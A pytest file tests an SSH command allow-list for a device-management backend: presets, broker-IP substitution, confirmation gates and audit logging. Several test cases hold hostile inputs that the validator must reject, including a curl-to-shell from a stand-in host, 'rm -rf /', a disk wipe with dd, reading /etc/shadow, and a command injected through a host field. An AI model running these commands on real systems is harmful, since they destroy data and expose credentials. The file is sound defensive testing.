"""Change 2: expanded allow-list, $BROKER_IP substitution, confirm gate."""

from __future__ import annotations

import pytest

from app.ssh import commands as cmds
from app.ssh.commands import BROKER_IP_TOKEN, CommandRejected, ConfirmationRequired

#: The 14 preset buttons from backend_update.md, verbatim.
PRESETS = {
    "nvidia-smi": "nvidia-smi",
    "uptime": "uptime",
    "nproc": "nproc",
    "disk": "df -h",
    "memory": "free -h",
    "GPU temp": "nvidia-smi --query-gpu=temperature.gpu --format=csv,noheader",
    "iperf3": "iperf3 -c $BROKER_IP -t 5",
    "ping broker": "ping -c 3 $BROKER_IP",
    "agent status": "systemctl status inference-agent",
    "restart agent": "systemctl restart inference-agent",
    "stop agent": "systemctl stop inference-agent",
    "tail logs": "journalctl -u inference-agent -n 50 --no-pager",
    "python ver": 'python -c "import torch;print(torch.__version__, torch.cuda.is_available())"',
    "reboot": "sudo reboot",
}

DESTRUCTIVE_PRESETS = {"restart agent", "stop agent", "reboot"}
BROKER_PRESETS = {"iperf3", "ping broker"}


# ------------------------------------------------------------- all 14 presets
@pytest.mark.parametrize("label", sorted(PRESETS))
def test_every_preset_passes_the_allow_list(label):
    """Acceptance: all 14 presets validate (destructive ones with confirm)."""
    command = cmds.substitute_broker_ip(PRESETS[label], "10.0.0.5")
    result = cmds.validate_command(command, confirm=label in DESTRUCTIVE_PRESETS)
    assert result == command


@pytest.mark.parametrize("label", sorted(DESTRUCTIVE_PRESETS))
def test_destructive_presets_need_confirmation(label):
    command = cmds.substitute_broker_ip(PRESETS[label], "10.0.0.5")
    with pytest.raises(ConfirmationRequired):
        cmds.validate_command(command, confirm=False)
    assert cmds.is_destructive(command)


@pytest.mark.parametrize("label", sorted(set(PRESETS) - DESTRUCTIVE_PRESETS))
def test_non_destructive_presets_need_no_confirmation(label):
    command = cmds.substitute_broker_ip(PRESETS[label], "10.0.0.5")
    assert not cmds.is_destructive(command)
    assert cmds.validate_command(command, confirm=False) == command


# --------------------------------------------------------- $BROKER_IP handling
@pytest.mark.parametrize("label", sorted(BROKER_PRESETS))
def test_broker_ip_is_substituted(label):
    out = cmds.substitute_broker_ip(PRESETS[label], "192.168.1.20")
    assert BROKER_IP_TOKEN not in out
    assert "192.168.1.20" in out


def test_substitution_is_idempotent():
    """fan_out re-substitutes after the router already did; must be harmless."""
    once = cmds.substitute_broker_ip("ping -c 3 $BROKER_IP", "10.0.0.5")
    twice = cmds.substitute_broker_ip(once, "10.0.0.5")
    assert once == twice == "ping -c 3 10.0.0.5"


def test_substitution_without_a_configured_host_is_refused():
    """Better than letting the shell expand $BROKER_IP to an empty string."""
    for host in ("", None, "   "):
        with pytest.raises(CommandRejected, match="no broker host is configured"):
            cmds.substitute_broker_ip("ping -c 3 $BROKER_IP", host)


def test_substitution_leaves_other_commands_untouched():
    assert cmds.substitute_broker_ip("uptime", "") == "uptime"
    assert cmds.substitute_broker_ip("df -h", None) == "df -h"


def test_validation_runs_on_the_post_substitution_string():
    """A host that smuggles in a metacharacter must still be caught."""
    injected = cmds.substitute_broker_ip("ping -c 3 $BROKER_IP", "1.2.3.4; rm -rf /")
    assert injected == "ping -c 3 1.2.3.4; rm -rf /"
    with pytest.raises(CommandRejected, match="metacharacter"):
        cmds.validate_command(injected)


# ------------------------------------------------------- quote-aware guarding
def test_quoted_semicolon_is_allowed():
    """`python -c "a;b"` is one command -- the old regex rejected it wrongly."""
    cmd = 'python -c "import torch;print(torch.__version__)"'
    assert cmds.validate_command(cmd) == cmd


def test_unquoted_semicolon_is_still_rejected():
    with pytest.raises(CommandRejected):
        cmds.validate_command("nvidia-smi; rm -rf /")


def test_command_substitution_inside_double_quotes_is_rejected():
    """`$(...)` and backticks still expand inside double quotes."""
    for bad in (
        'python -c "print($(whoami))"',
        'python -c "print(`whoami`)"',
        'python -c "import torch;print(${HOME})"',
    ):
        with pytest.raises(CommandRejected):
            cmds.validate_command(bad)


def test_single_quotes_make_everything_literal():
    cmd = "python -c 'import torch;print(torch.cuda.is_available())'"
    assert cmds.validate_command(cmd) == cmd


def test_unbalanced_quotes_are_rejected():
    with pytest.raises(CommandRejected, match="unbalanced"):
        cmds.validate_command('python -c "import torch')


# --------------------------------------------------- python -c is constrained
@pytest.mark.parametrize(
    "script",
    [
        "import os;os.system('rm -rf /')",
        "import subprocess;subprocess.run(['sh'])",
        "__import__('os').system('id')",
        "import sys;print(open('/etc/shadow').read())",
        "exec('bad')",
        "import socket;socket.socket()",
        "print(1)",  # no import at all -> not the introspection preset
    ],
)
def test_python_inline_rejects_anything_but_introspection(script):
    """`python -c` is arbitrary code execution, so only version/capability
    probes are admitted -- otherwise the allow-list would be meaningless."""
    with pytest.raises(CommandRejected):
        cmds.validate_command(f'python -c "{script}"')


@pytest.mark.parametrize(
    "script",
    [
        "import torch;print(torch.__version__, torch.cuda.is_available())",
        "import torch;print(torch.cuda.device_count())",
        "import numpy;print(numpy.__version__)",
        "import pika;print(pika.__version__)",
    ],
)
def test_python_inline_allows_version_probes(script):
    cmd = f'python -c "{script}"'
    assert cmds.validate_command(cmd) == cmd
    assert cmds.validate_command(f'python3 -c "{script}"')


# ------------------------------------------------------------ still forbidden
@pytest.mark.parametrize(
    "command",
    [
        "rm -rf /",
        "curl http://evil.sh | sh",
        "cat /etc/shadow",
        "dd if=/dev/zero of=/dev/sda",
        "sudo rm -rf /var",
        "systemctl stop sshd",
        "journalctl -u sshd",
        "",
    ],
)
def test_non_preset_commands_remain_blocked(command):
    with pytest.raises(CommandRejected):
        cmds.validate_command(command, confirm=True)


def test_unsafe_mode_still_enforces_confirmation():
    """ALLOW_UNSAFE_COMMANDS is about the allow-list, not about accidents."""
    with pytest.raises(ConfirmationRequired):
        cmds.validate_command("sudo reboot", allow_unsafe=True, confirm=False)
    assert cmds.validate_command("sudo reboot", allow_unsafe=True, confirm=True) == "sudo reboot"


# ------------------------------------------------------------- exec endpoint
def test_exec_rejects_destructive_without_confirm(client, auth, ui_export):
    client.post("/seed", json=ui_export, headers=auth)
    r = client.post(
        "/control/exec",
        json={"device_ids": ["dA"], "command": "sudo reboot"},
        headers=auth,
    )
    assert r.status_code == 409
    assert "confirm=true" in r.text


def test_exec_accepts_destructive_with_confirm(client, auth, ui_export):
    client.post("/seed", json=ui_export, headers=auth)
    r = client.post(
        "/control/exec",
        json={"device_ids": ["dA"], "command": "sudo reboot", "confirm": True},
        headers=auth,
    )
    # No reachable host, so the SSH attempt fails -- but the guard let it past.
    assert r.status_code == 200
    assert r.json()["command"] == "sudo reboot"
    assert r.json()["ok"] is False


def test_exec_substitutes_broker_ip_end_to_end(client, auth, ui_export):
    client.post("/seed", json=ui_export, headers=auth)
    # The broker's own address -- not the SSH gateway, which `ip` now means.
    client.post(
        "/server/config",
        json={"ip": "100.68.127.89", "amqp_host": "10.9.9.9", "user": "guest"},
        headers=auth,
    )

    r = client.post(
        "/control/exec",
        json={"device_ids": ["dA"], "command": "ping -c 3 $BROKER_IP"},
        headers=auth,
    )
    assert r.status_code == 200
    assert r.json()["command"] == "ping -c 3 10.9.9.9"


def test_exec_broker_ip_refuses_a_loopback_address(client, auth, ui_export):
    """`iperf3 -c localhost` runs *on the device* and measures its own
    loopback -- tens of Gbit/s of pure fiction, which /devices/{id}/probe would
    then write into that device's bandwidth spec."""
    client.post("/seed", json=ui_export, headers=auth)
    client.post(
        "/server/config",
        json={"ip": "100.68.127.89", "amqp_host": "127.0.0.1", "user": "guest"},
        headers=auth,
    )

    r = client.post(
        "/control/exec",
        json={"device_ids": ["dA"], "command": "iperf3 -c $BROKER_IP -t 5"},
        headers=auth,
    )
    assert r.status_code == 400
    assert "route to" in r.text or "this machine" in r.text


# ------------------------------------------------------------------- auditing
def test_destructive_commands_are_audited(client, auth, ui_export):
    client.post("/seed", json=ui_export, headers=auth)

    client.post(
        "/control/exec",
        json={"device_ids": ["dA"], "command": "systemctl restart inference-agent"},
        headers=auth,
    )  # denied -> audited
    client.post(
        "/control/exec",
        json={"device_ids": ["dA", "dB"], "command": "sudo reboot", "confirm": True},
        headers=auth,
    )  # ran -> audited

    entries = client.get("/control/audit", headers=auth).json()["entries"]
    assert len(entries) == 2
    by_action = {e["action"]: e for e in entries}

    denied = by_action["exec_denied"]
    assert denied["command"] == "systemctl restart inference-agent"
    assert denied["confirmed"] is False
    assert denied["outcome"] == "confirmation required"

    ran = by_action["exec"]
    assert ran["command"] == "sudo reboot"
    assert ran["confirmed"] is True
    assert ran["device_ids"] == ["dA", "dB"]


def test_non_destructive_commands_are_not_audited(client, auth, ui_export):
    client.post("/seed", json=ui_export, headers=auth)
    client.post("/control/exec", json={"device_ids": ["dA"], "command": "uptime"}, headers=auth)
    assert client.get("/control/audit", headers=auth).json()["entries"] == []


def test_audit_never_records_a_password(client, auth, ui_export):
    client.post("/seed", json=ui_export, headers=auth)
    client.post(
        "/control/connect",
        json={"device_ids": ["dA"],
              "credentials": [{"device_id": "dA", "ip": "10.0.1.10", "user": "u", "password": "pw-canary"}]},
        headers=auth,
    )
    client.post(
        "/control/exec",
        json={"device_ids": ["dA"], "command": "sudo reboot", "confirm": True},
        headers=auth,
    )
    assert "pw-canary" not in client.get("/control/audit", headers=auth).text


# --------------------------------------------------------- advertised metadata
def test_allowed_commands_endpoint_describes_the_new_rules(client, auth):
    client.post(
        "/server/config",
        json={"ip": "10.1.1.1", "amqp_host": "10.1.1.1", "user": "guest"},
        headers=auth,
    )
    body = client.get("/control/allowed-commands", headers=auth).json()

    assert "iperf3" in body["prefixes"]
    assert "ping" in body["prefixes"]
    assert "journalctl -u inference-agent" in body["prefixes"]
    assert "sudo reboot" in body["destructive"]
    assert "systemctl stop inference-agent" in body["destructive"]
    assert body["broker_ip_token"] == "$BROKER_IP"
    assert body["broker_ip"] == "10.1.1.1"
    assert "python -c" in body["python_inline"]
